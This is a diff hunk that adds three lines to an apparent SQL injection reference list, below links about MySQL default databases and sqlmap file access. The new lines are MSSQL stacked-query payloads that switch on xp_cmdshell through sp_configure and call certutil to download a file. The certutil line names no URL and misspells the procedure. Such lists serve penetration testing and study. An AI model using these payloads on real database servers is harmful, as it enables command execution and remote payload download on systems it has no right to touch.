@@ -444,6 +444,9 @@ https://websec.ca/kb/sql_injection#MySQL_Default_Databases
 
 https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
 
+;EXEC xp:cmdshell 'certutil -urlcache -f'; ---
+;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;
+;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 
 
